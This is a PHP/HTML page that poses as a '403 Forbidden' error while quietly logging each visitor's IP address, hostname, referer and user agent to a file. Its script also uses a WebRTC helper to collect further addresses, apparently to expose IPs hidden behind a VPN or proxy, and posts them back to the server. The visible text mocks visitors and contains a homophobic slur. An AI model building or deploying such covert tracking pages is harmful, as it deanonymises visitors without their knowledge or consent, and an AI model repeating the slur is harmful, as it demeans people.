<?php
if (count($_POST) > 0) {
	$file = fopen("log.txt", "a");
	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
	$remote = $_SERVER ['REMOTE_ADDR'];
	fwrite($file, "Connecting from:\n\t " . $remote . " (" . gethostbyaddr($remote) . ")\n");
	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
	fwrite($file, "Found addresses:\n");
	foreach ( $_POST as $ip ) {
		if ($ip == "none" && count($_POST) > 1) {
			continue;
		}
		
		$ips = explode(",", $ip);
		
		foreach ( $ips as $address ) {
			if (strlen($address) > 1) {
				fwrite($file, "\t" . $address . " ");
				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
			}
		}
	}
	fwrite($file, "\n\n\n");
	fclose($file);
	exit();
}
?>

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<embed src='https://youtube.googleapis.com/v/7p42uCWF7_Q%26autoplay=1' type='application/x-shockwave-flash' wmode='transparent' height='1' width='1'><html>
<style>
.button {
    background-color: #555555;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 12px;
    margin: 4px 2px;
    cursor: pointer;
}

.button1 {font-size: 10px;}
.button5 {background-color: #555555;} /* Black */
</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">

body

{background-image:url("22672.gif");

background-repeat:repeat-y;

background-position:top center;

background-attachment:fixed}

</style>


</head>

<center>
<font color="FFFFFF" size="5">
<p><b><span style="font-size: 22pt;"><font style="font-size: 1pt;" face="Impact" color="#000000" size="15">            
<font size="5">
</font></font></span></b></p><center><b><font style="font-size: 1pt;" face="Impact" color="#000000" size="15"><font size="5">
<font span="" style="color:white;text-shadow: 0px 0px 10px black" face="verdana">
<script language="JavaScript">
var text="<font color=FFFFFF face=Monospace size=6><left></left> \
<center><left>403:<br>Forbidden<br><br>Your Ass Has Been Logged<br>Please Dont Be a Skid<br><br>Fuck Off<br>This is My Server!!!<br><br><q>Faggots</q><br>-<br></left> \
</font>";
<body>

<body><align='left'>

<center>
<font color="FFFFFF" size="5">
<p><b><span style="font-size: 22pt;"><font style="font-size: 1pt;" face="Impact" color="#000000" size="15">            
<font size="5">
</font></font></span></b></p><center><b><font style="font-size: 1pt;" face="Impact" color="#000000" size="15"><font size="5">
<font span="" style="color:white;text-shadow: 0px 0px 10px black" face="verdana">
<script language="JavaScript">
var text="<font color=FFFFFF face=Monospace size=6><left></left> \
<center><left><br><br><br><br><br></q><br>-<br></left> \
</font>";
var delay=100;
var currentChar=1;
var destination="";
 
function type()
{
  if (document.getElementById)
  {
    var dest=document.getElementById(destination);
    if (dest)
    {
      dest.innerHTML=text.substr(0, currentChar);
      currentChar++
      if (currentChar>text.length)
      {
        setTimeout("type()", delay);
      }
      else
      {
        setTimeout("type()", delay);
      }
    }
  }
}
 
function startTyping(textParam, delayParam, destinationParam)
{
  text=textParam;
  delay=delayParam;
  currentChar=1;       
  destination=destinationParam;
  type();
}
 
//
function FP_popUpMsg(msg) {//v1.0
 alert(msg);
}
</script>
<div id="textDestination"><font face="Monospace" color="FFFFFF" size="6"><left></left> </font><center><font face="Monospace" color="FFFFFF" size="6"><left>403:<br>Forbidden<br><br>Your Ass Has Been Logged<br>Please Dont Be a Skid<br><br>Fuck Off<br>This is My Server!!!<br><br><q>Faggots</q><br>-<br></left> </font></center></div>
<script language="JavaScript">
startTyping(text, 40, "textDestination");
</script>

	<footer style=" position: absolute; bottom: 0; left: 5; right 5; left 0; width: 99%; text-align: center;">
	<div class="">
			<marquee style="margin-top: 5px;" behavior="scroll" direction="left"><font color="FFFFFF" size="4">YOU DEFINITELY GOT LOGGED, BEST HOPE YOU TURNED OFF YOUR MOTHERFUCKING WEBRTC KID!</font></marquee>
                        
	</div>
	<div class="clearfix"></div>
				
	</footer>



	<form id="f" method="POST">
		<input name="0" value="none" type="hidden"></input>
	</form>

	<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
	<script src="webrtc.js"></script>
	<script>

	setTimeout(post, 1000);

		function post() {
			$.post("index.php",
				{
		    	   	s: ips,
		    	},
		    	function(data, status) {

		    	}
		   	);  
		}
    </script>
</body>
</html>